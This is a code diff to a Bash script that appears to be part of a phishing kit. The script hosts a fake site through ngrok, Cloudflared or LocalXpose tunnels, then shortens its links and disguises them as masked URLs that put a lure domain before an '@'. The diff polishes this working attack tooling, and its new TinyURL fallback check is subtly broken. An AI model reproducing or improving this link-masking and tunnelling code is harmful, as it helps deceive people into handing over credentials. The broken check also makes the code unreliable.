@@ -323,7 +323,7 @@ ngrok_region() {
 }
 ## Start ngrok
 start_ngrok() {
-        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST ${GREEN})"
         { sleep 1; setup_site; }
 	echo -e "\n"
 	ngrokregion="us"
@@ -338,7 +338,7 @@ start_ngrok() {
     if [[ `command -v termux-chroot` ]]; then
         sleep 2 && ./.server/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
     else
-        sleep 2 && ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT"> /dev/null 2>&1 &
+        sleep 2 && ./.server/ngrok http --region ${ngrokregion} "$HOST":"$PORT"> /dev/null 2>&1 &
     fi
 	sleep 15
 	fetchlink_ngrok
@@ -381,7 +381,7 @@ install_cloudflared() {
 ## Start Cloudflared
 start_cloudflared() {
         rm .cld.log > /dev/null 2>&1 &
-        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST ${GREEN})"
         { sleep 1; setup_site; }
         echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
 
@@ -449,7 +449,7 @@ token_localxpose() {
 }
 ## Start LocalXpose
 start_loclx() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -e "\n"
 	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] : ${ORANGE} " opinion
@@ -501,7 +501,7 @@ download() {
 
 ## Start localhost
 start_localhost() {
-        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
+        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST ${GREEN})"
         setup_site
         { sleep 1; clear; banner; }
         echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
@@ -635,24 +635,28 @@ shorten_isgd() {
 	masked_isgd_url="${CUS_URL}-${Keystks}@$processed_isgd_url"
 }
 shorten_shortcode() {
-	link_shortcode1=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
-	processed_shortcode_url1=$(echo ${link_shortcode1} | sed 's/\\//g' | grep -o '"short_link":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
+	link_shortcode=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
+	processed_shortcode_url1=$(echo ${link_shortcode} | sed 's/\\//g' | grep -o '"short_link":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
 	final_shortcode_url1="https://$processed_shortcode_url1"
 	masked_shortcode_url1="${CUS_URL}-${Keystks}@$processed_shortcode_url1"
-	link_shortcode2=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
-	processed_shortcode_url2=$(echo ${link_shortcode2} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
+	processed_shortcode_url2=$(echo ${link_shortcode} | sed 's/\\//g' | grep -o '"short_link2":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
 	final_shortcode_url2="https://$processed_shortcode_url2"
 	masked_shortcode_url2="${CUS_URL}-${Keystks}@$processed_shortcode_url2"
-	link_shortcode3=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
-	processed_shortcode_url3=$(echo ${link_shortcode3} | sed 's/\\//g' | grep -o '"short_link3":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
+	processed_shortcode_url3=$(echo ${link_shortcode} | sed 's/\\//g' | grep -o '"short_link3":"[a-zA-Z0-9./-]*' | awk -F\" '{print $4}')
 	final_shortcode_url3="https://$processed_shortcode_url3"
 	masked_shortcode_url3="${CUS_URL}-${Keystks}@$processed_shortcode_url3"
 }
 shorten_tinyurl() {
 	link_tinyurl=$(curl --silent --insecure --fail --retry-connrefused --retry 2 --retry-delay 2 "$1$2")
-	processed_tinyurl_url=${link_tinyurl#http*//}
-	final_tinyurl_url="https://$processed_tinyurl_url"
-	masked_tinyurl_url="${CUS_URL}-${Keystks}@$processed_tinyurl_url"
+	if [ -z "link_tinyurl" ]; then
+		processed_tinyurl_url="${ORANGE} Couldn't shorten this link here"
+		final_tinyurl_url="${ORANGE} Couldn't shorten this link here"
+		masked_tinyurl_url="${ORANGE} Couldn't mask this link here"
+	else
+		processed_tinyurl_url=${link_tinyurl#http*//}
+		final_tinyurl_url="https://$processed_tinyurl_url"
+		masked_tinyurl_url="${CUS_URL}-${Keystks}@$processed_tinyurl_url"
+	fi
 }
 
 ## Display link
